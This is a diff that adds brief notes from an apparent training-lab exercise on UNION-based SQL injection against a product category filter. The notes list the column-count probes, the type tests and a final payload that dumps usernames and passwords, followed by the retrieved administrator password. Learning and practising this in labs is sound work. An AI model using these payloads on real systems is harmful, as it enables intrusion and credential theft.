@@ -1,0 +1,23 @@
+SQLi - Product category filter
+
+End Goal - Output usernames and passwords in user table and log in as admin user.
+
+Analysis:
+
+1. Determine # of columns that the vulnerable query is using.
+-> order by 1--
+-> order by 2--
+-> order by 3--   (internal server error)
+
+2. Determine the data type of the columns
+
+SELECT a, b FROM Products WHERE category=Gifts
+
+-> ' UNION SELECT 'a', NULL-- 
+-> ' UNION SELECT 'a', 'a'-- 
+(both columns are of data type string.)
+
+ ' UNION SELECT username, password FROM users--
+
+administrator
+2e25xs5fn94udbrqutju
